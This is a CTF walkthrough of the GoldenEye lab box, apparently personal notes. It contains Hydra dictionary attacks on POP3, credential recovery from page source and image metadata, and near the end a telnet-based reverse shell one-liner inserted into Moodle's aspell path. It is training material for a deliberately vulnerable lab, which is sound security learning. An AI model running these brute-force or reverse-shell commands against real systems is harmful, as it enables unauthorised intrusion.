---
Bond, James Bond. A guided CTF.
---

![](https://tryhackme-images.s3.amazonaws.com/room-icons/77b55a2ac1ac79ca534d6fc003c042b3.png)

###  Intro & Enumeration

 Start Machine

This room will be a guided challenge to hack the James Bond styled box and get root.

Credit to [creosote](https://www.vulnhub.com/author/creosote,584/) for creating this VM. This machine is used here with the explicit permission of the creator <3

So.. Lets get started!

Answer the questions below

```
┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.146.26 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.146.26:25
Open 10.10.146.26:80
Open 10.10.146.26:55006
Open 10.10.146.26:55007
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-03 12:59 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:59
Completed NSE at 12:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:59
Completed NSE at 12:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:59
Completed NSE at 12:59, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:59
Completed Parallel DNS resolution of 1 host. at 12:59, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:59
Scanning 10.10.146.26 [4 ports]
Discovered open port 25/tcp on 10.10.146.26
Discovered open port 55007/tcp on 10.10.146.26
Discovered open port 80/tcp on 10.10.146.26
Discovered open port 55006/tcp on 10.10.146.26
Completed Connect Scan at 12:59, 0.20s elapsed (4 total ports)
Initiating Service scan at 12:59
Scanning 4 services on 10.10.146.26
Completed Service scan at 13:00, 28.54s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.146.26.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 4.02s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 3.07s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 0.00s elapsed
Nmap scan report for 10.10.146.26
Host is up, received user-set (0.20s latency).
Scanned at 2023-02-03 12:59:34 EST for 36s

PORT      STATE SERVICE  REASON  VERSION
25/tcp    open  smtp     syn-ack Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| ssl-cert: Subject: commonName=ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-04-24T03:22:34
| Not valid after:  2028-04-21T03:22:34
| MD5:   cd4ad178f21617fb21a60a168f46c8c6
| SHA-1: fda3fc7b6601474696aa0f56b1261c2936e8442c
| -----BEGIN CERTIFICATE-----
| MIICsjCCAZqgAwIBAgIJAPokpqPNVgk6MA0GCSqGSIb3DQEBCwUAMBExDzANBgNV
| BAMTBnVidW50dTAeFw0xODA0MjQwMzIyMzRaFw0yODA0MjEwMzIyMzRaMBExDzAN
| BgNVBAMTBnVidW50dTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMM6
| ryxPHxf2wYf7DNTXnW6Hc6wK+O6/3JVeWME041jJdsY2UpxRB6cTmBIv7dAOHZzL
| eSVCfH1P3IS0dvSrqkA+zpPRK3to3SuirknpbPdmsNqMG1SiKLDl01o5LBDgIpcY
| V9JNNjGaxYBlyMjvPDDvgihmJwpb81lArUqDrGJIsIH8J6tqOdLt4DGBXU62sj//
| +IUE4w6c67uMAYQD26ZZH9Op+qJ3OznCTXwmJslIHQLJx+fXG53+BLiV06EGrsOk
| ovnPmixShoaySAsoGm56IIHQUWrCQ03VYHfhCoUviEw02q8oP49PHR1twt+mdj6x
| qZOBlgwHMcWgb1Em40UCAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF
| AAOCAQEAfigEwPIFEL21yc3LIzPvHUIvBM5/fWEEv0t+8t5ATPfI6c2Be6xePPm6
| W3bDLDQ30UDFmZpTLgLkfAQRlu4N40rLutTHiAN6RFSdAA8FEj72cwcX99S0kGQJ
| vFCSipVd0fv0wyKLVwbXqb1+JfmepeZVxWFWjiDg+JIBT3VmozKQtrLLL/IrWxGd
| PI2swX8KxikRYskNWW1isMo2ZXXJpdQJKfikSX334D9oUnSiHcLryapCJFfQa81+
| T8rlFo0zan33r9BmA5uOUZ7VlYF4Kn5/soSE9l+JbDrDFOIOOLLILoQUVZcO6rul
| mJjFdmZE4k3QPKz1ksaCAQkQbf3OZw==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
80/tcp    open  http     syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-title: GoldenEye Primary Admin Server
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
55006/tcp open  ssl/pop3 syn-ack Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: TOP CAPA USER SASL(PLAIN) AUTH-RESP-CODE PIPELINING RESP-CODES UIDL
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost
| Issuer: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-04-24T03:23:52
| Not valid after:  2028-04-23T03:23:52
| MD5:   d0392e71c76a2cb3e694ec407228ec63
| SHA-1: 9d6a92eb5f9fe9ba6cbddc9355fa5754219b0b77
| -----BEGIN CERTIFICATE-----
| MIIDnTCCAoWgAwIBAgIJAOZHv9ZnCiJ+MA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV
| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG
| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe
| Fw0xODA0MjQwMzIzNTJaFw0yODA0MjMwMzIzNTJaMGUxHDAaBgNVBAoME0RvdmVj
| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j
| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAMo64gzxBeOvt+rgUQncWU2OJESGR5YJ9Mcd
| h0nF6m0o+zXwvkSx+SW5I3I/mpJugQfsc2lW4txo3xoAbvVgc2kpkkna8ojodTS3
| iUyKXwN3y2KG/jyBcrH+rZcs5FIpt5tDB/F1Uj0cdAUZ+J/v2NEw1w+KjlX2D0Zr
| xpgnJszmEMJ3DxNBc8+JiROMT7V8iYu9/Cd8ulAdS8lSPFE+M9/gZBsRbzRWD3D/
| OtDaPzBTlb6es4NfrfPBanD7zc8hwNL5AypUG/dUhn3k3rjUNplIlVD1lSesI+wM
| 9bIIVo3IFQEqiNnTdFVz4+EOr8hI7SBzsXTOrxtH23NQ6MrGbLUCAwEAAaNQME4w
| HQYDVR0OBBYEFFGO3VTitI69jNHsQzOz/7wwmdfaMB8GA1UdIwQYMBaAFFGO3VTi
| tI69jNHsQzOz/7wwmdfaMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AMm4cTA4oSLGXG+wwiJWD/2UjXta7XAAzXofrDfkRmjyPhMTsuwzfUbU+hHsVjCi
| CsjV6LkVxedX4+EQZ+wSa6lXdn/0xlNOk5VpMjYkvff0ODTGTmRrKgZV3L7K/p45
| FI1/vD6ziNUlaTzKFPkmW59oGkdXfdJ06Y7uo7WQALn2FI2ZKecDSK0LonWnA61a
| +gXFctOYRnyMtwiaU2+U49O8/vSDzcyF0wD5ltydCAqCdMTeeo+9DNa2u2IOZ4so
| yPyR+bfnTC45hue/yiyOfzDkBeCGBqXFYcox+EUm0CPESYYNk1siFjjDVUNjPGmm
| e1/vPH7tRtldZFSfflyHUsA=
|_-----END CERTIFICATE-----
55007/tcp open  pop3     syn-ack Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost
| Issuer: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-04-24T03:23:52
| Not valid after:  2028-04-23T03:23:52
| MD5:   d0392e71c76a2cb3e694ec407228ec63
| SHA-1: 9d6a92eb5f9fe9ba6cbddc9355fa5754219b0b77
| -----BEGIN CERTIFICATE-----
| MIIDnTCCAoWgAwIBAgIJAOZHv9ZnCiJ+MA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV
| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG
| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe
| Fw0xODA0MjQwMzIzNTJaFw0yODA0MjMwMzIzNTJaMGUxHDAaBgNVBAoME0RvdmVj
| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j
| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAMo64gzxBeOvt+rgUQncWU2OJESGR5YJ9Mcd
| h0nF6m0o+zXwvkSx+SW5I3I/mpJugQfsc2lW4txo3xoAbvVgc2kpkkna8ojodTS3
| iUyKXwN3y2KG/jyBcrH+rZcs5FIpt5tDB/F1Uj0cdAUZ+J/v2NEw1w+KjlX2D0Zr
| xpgnJszmEMJ3DxNBc8+JiROMT7V8iYu9/Cd8ulAdS8lSPFE+M9/gZBsRbzRWD3D/
| OtDaPzBTlb6es4NfrfPBanD7zc8hwNL5AypUG/dUhn3k3rjUNplIlVD1lSesI+wM
| 9bIIVo3IFQEqiNnTdFVz4+EOr8hI7SBzsXTOrxtH23NQ6MrGbLUCAwEAAaNQME4w
| HQYDVR0OBBYEFFGO3VTitI69jNHsQzOz/7wwmdfaMB8GA1UdIwQYMBaAFFGO3VTi
| tI69jNHsQzOz/7wwmdfaMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AMm4cTA4oSLGXG+wwiJWD/2UjXta7XAAzXofrDfkRmjyPhMTsuwzfUbU+hHsVjCi
| CsjV6LkVxedX4+EQZ+wSa6lXdn/0xlNOk5VpMjYkvff0ODTGTmRrKgZV3L7K/p45
| FI1/vD6ziNUlaTzKFPkmW59oGkdXfdJ06Y7uo7WQALn2FI2ZKecDSK0LonWnA61a
| +gXFctOYRnyMtwiaU2+U49O8/vSDzcyF0wD5ltydCAqCdMTeeo+9DNa2u2IOZ4so
| yPyR+bfnTC45hue/yiyOfzDkBeCGBqXFYcox+EUm0CPESYYNk1siFjjDVUNjPGmm
| e1/vPH7tRtldZFSfflyHUsA=
|_-----END CERTIFICATE-----
|_pop3-capabilities: TOP SASL(PLAIN) UIDL CAPA USER STLS AUTH-RESP-CODE PIPELINING RESP-CODES

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.26 seconds

view-source:http://10.10.146.26/

<html>
<head>
<title>GoldenEye Primary Admin Server</title>
<link rel="stylesheet" href="index.css">
</head>

	<span id="GoldenEyeText" class="typeing"></span><span class='blinker'>&#32;</span>

<script src="terminal.js"></script>
	
</html>

body {
  background: black;
}

span {
  color: red;
  font-family: monospace;
  font-size: 27;
}

.blinker {
  opacity: 1;
  margin-bottom: -2px;
  height: 15px;
  margin-left: -5px;
  border-left: 7px solid white;
  animation: blinker 0.9s steps(2, start) infinite;
}

@keyframes blinker {
  to { 
    visibility: hidden; 
  }
}

var data = [
  {
    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>"
  }
];

//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//

var allElements = document.getElementsByClassName("typeing");
for (var j = 0; j < allElements.length; j++) {
  var currentElementId = allElements[j].id;
  var currentElementIdContent = data[0][currentElementId];
  var element = document.getElementById(currentElementId);
  var devTypeText = currentElementIdContent;

 
  var i = 0, isTag, text;
  (function type() {
    text = devTypeText.slice(0, ++i);
    if (text === devTypeText) return;
    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
    var char = text.slice(-1);
    if (char === "<") isTag = true;
    if (char === ">") isTag = false;
    if (isTag) return type();
    setTimeout(type, 60);
  })();
}

cyberchef

&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;

From HTML entity

InvincibleHack3r

```

![[Pasted image 20230203130306.png]]

First things first, connect to our [network](http://access/) and deploy the machine.

Question Done

Use nmap to scan the network for all ports. How many ports are open?

	nmap -p- -Pn <ip>

*4*

Take a look on the website, take a dive into the source code too and remember to inspect all scripts!

Question Done

Who needs to make sure they update their default password?

*Boris*

Whats their password?

*InvincibleHack3r*

Now go use those credentials and login to a part of the site.

Question Done


###  Its mail time...

Onto the next steps.. 

Answer the questions below

```
┌──(kali㉿kali)-[~/Downloads]
└─$ telnet 10.10.146.26 25
Trying 10.10.146.26...
Connected to 10.10.146.26.
Escape character is '^]'.
220 ubuntu GoldentEye SMTP Electronic-Mail agent
HELO telnet
250 ubuntu
USER boris
502 5.5.2 Error: command not recognized
QUIT
221 2.0.0 Bye
Connection closed by foreign host.

┌──(kali㉿kali)-[~/Downloads]
└─$ telnet 10.10.146.26 55007
Trying 10.10.146.26...
Connected to 10.10.146.26.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS InvincibleHack3r
-ERR [AUTH] Authentication failed.
-ERR Disconnected for inactivity.
Connection closed by foreign host.

BTW Natalya says she can break your codes

┌──(kali㉿kali)-[~/Downloads]
└─$ hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3://10.10.146.26:55007 -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-03 13:39:23
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 64 tasks per 1 server, overall 64 tasks, 222 login tries (l:1/p:222), ~4 tries per task
[DATA] attacking pop3://10.10.146.26:55007/
[STATUS] 159.00 tries/min, 159 tries in 00:01h, 86 to do in 00:01h, 41 active
[55007][pop3] host: 10.10.146.26   login: boris   password: secret1!
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 11 final worker threads did not complete until end.
[ERROR] 11 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-03 13:40:43
                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3://10.10.146.26:55007 -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-03 13:41:00
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 222 login tries (l:1/p:222), ~4 tries per task
[DATA] attacking pop3://10.10.146.26:55007/
[55007][pop3] host: 10.10.146.26   login: natalya   password: bird
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 13 final worker threads did not complete until end.
[ERROR] 13 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-03 13:41:43

┌──(kali㉿kali)-[~/Downloads]
└─$ telnet 10.10.146.26 55007
Trying 10.10.146.26...
Connected to 10.10.146.26.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
user boris
+OK
pass secret1!
+OK Logged in.
LIST
+OK 3 messages:
1 544
2 373
3 921
.
RETR 1
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id D9E47454B1
	for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
.
RETR 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id C3F2B454B1
	for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.
RETR 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id 4B9F4454B1
	for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.

┌──(kali㉿kali)-[~/Downloads]
└─$ telnet 10.10.146.26 55007
Trying 10.10.146.26...
Connected to 10.10.146.26.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
user natalya
+OK
pass bird
+OK Logged in.
LIST
+OK 2 messages:
1 631
2 1048
.
RETR 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id D5EDA454B1
	for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
RETR 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 17C96454B1
	for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.


.
quit
+OK Logging out.
Connection closed by foreign host.


```

![[Pasted image 20230203135927.png]]


Take a look at some of the other services you found using your nmap scan. Are the credentials you have re-usable?   

Question Done

If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra?Whats their new password?

pop3

*secret1!*

Inspect port 55007, what services is configured to use this port?

*telnet*

Login using that service and the credentials you found earlier.

Question Done

What can you find on this service?

*emails*

What user can break Boris' codes?

*natalya*

Using the users you found on this service, find other users passwords

Question Done

Keep enumerating users using this service and keep attempting to obtain their passwords via dictionary attacks.

You will eventually get a xenia's password in plaintext.

 Completed

### GoldenEye Operators Training

Enumeration really is key. Making notes and referring back to them can be lifesaving. We shall now go onto getting a user shell.

Answer the questions below

```
└─$ tail /etc/hosts           
10.10.167.117 team.thm
10.10.167.117 dev.team.thm
10.10.29.100 set.windcorp.thm
10.10.20.190 Osiris.windcorp.thm Osiris osiris.windcorp.thm
10.10.37.31  UNATCO
10.10.73.143 jack.thm
#127.0.0.1  newcms.mofo.pwn
10.200.108.33 holo.live 
10.200.108.33 www.holo.live admin.holo.live dev.holo.live
10.10.146.26  severnaya-station.com

view-source:http://severnaya-station.com/terminal.js

var data = [
  {
    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>"
  }
];

//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//

var allElements = document.getElementsByClassName("typeing");
for (var j = 0; j < allElements.length; j++) {
  var currentElementId = allElements[j].id;
  var currentElementIdContent = data[0][currentElementId];
  var element = document.getElementById(currentElementId);
  var devTypeText = currentElementIdContent;

 
  var i = 0, isTag, text;
  (function type() {
    text = devTypeText.slice(0, ++i);
    if (text === devTypeText) return;
    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
    var char = text.slice(-1);
    if (char === "<") isTag = true;
    if (char === ">") isTag = false;
    if (isTag) return type();
    setTimeout(type, 60);
  })();
}

http://severnaya-station.com/gnocertdir/

http://severnaya-station.com/gnocertdir/login/index.php

after login

http://severnaya-station.com/gnocertdir/enrol/index.php?id=2

IDOR?

http://severnaya-station.com/gnocertdir/user/profile.php?id=0

Nope
The details of this user are not available to you

http://severnaya-station.com/gnocertdir/message/index.php?viewing=unread&user2=5

Tuesday, 24 April 2018
09:24 PM: Greetings Xenia,

As a new Contractor to our GoldenEye training I welcome you. Once your account has been complete, more courses will appear on your dashboard. If you have any questions message me via email, not here.

My email username is...

doak

Thank you,

Cheers,

Dr. Doak "The Doctor"
Training Scientist - Sr Level Training Operating Supervisor
GoldenEye Operations Center Sector
Level 14 - NO2 - id:998623-1334
Campus 4, Building 57, Floor -8, Sector 6, cube 1,007
Phone 555-193-826
Cell 555-836-0944
Office 555-846-9811
Personal 555-826-9923
Email: doak@
Please Recycle before you print, Stay Green aka save the company money!
"There's such a thing as Good Grief. Just ask Charlie Brown" - someguy
"You miss 100% of the shots you don't shoot at" - Wayne G.
THIS IS A SECURE MESSAGE DO NOT SEND IT UNLESS.

┌──(kali㉿kali)-[~/Downloads]
└─$ hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://10.10.146.26:55007 -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-03 14:05:03
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 222 login tries (l:1/p:222), ~4 tries per task
[DATA] attacking pop3://10.10.146.26:55007/
[55007][pop3] host: 10.10.146.26   login: doak   password: goat
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-03 14:05:44


doak:goat

┌──(kali㉿kali)-[~/Downloads]
└─$ telnet 10.10.146.26 55007                                                          
Trying 10.10.146.26...
Connected to 10.10.146.26.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
user doak
+OK
pass goat
+OK Logged in.
LIST
+OK 1 messages:
1 606
.
RETR 1
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 97DC24549D
	for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!

.
QUIT
+OK Logging out.
Connection closed by foreign host.

Login

http://severnaya-station.com/gnocertdir/

http://severnaya-station.com/gnocertdir/user/files.php

For James --- secret.txt


007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.

┌──(kali㉿kali)-[~/Downloads]
└─$ wget http://10.10.146.26/dir007key/for-007.jpg                                
--2023-02-03 14:11:52--  http://10.10.146.26/dir007key/for-007.jpg
Connecting to 10.10.146.26:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14896 (15K) [image/jpeg]
Saving to: ‘for-007.jpg’

for-007.jpg             100%[=============================>]  14.55K  73.2KB/s    in 0.2s    

2023-02-03 14:11:53 (73.2 KB/s) - ‘for-007.jpg’ saved [14896/14896]

                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ exiftool for-007.jpg                                                 
ExifTool Version Number         : 12.52
File Name                       : for-007.jpg
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2018:04:24 20:40:02-04:00
File Access Date/Time           : 2023:02:03 14:11:53-05:00
File Inode Change Date/Time     : 2023:02:03 14:11:53-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 300
Y Resolution                    : 300
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : eFdpbnRlcjE5OTV4IQ==
Make                            : GoldenEye
Resolution Unit                 : inches
Software                        : linux
Artist                          : For James
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
User Comment                    : For 007
Flashpix Version                : 0100
Image Width                     : 313
Image Height                    : 212
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 313x212
Megapixels                      : 0.066

admin: xWinter1995x!

http://severnaya-station.com/gnocertdir/

Search spell

There's a path aspell

sh -c '(sleep 4062|telnet 192.168.230.132 4444|while : ; do sh && break; done 2>&1|telnet 192.168.230.132 4444 >/dev/null 2>&1 &)'

let's replace it with
https://www.revshells.com/


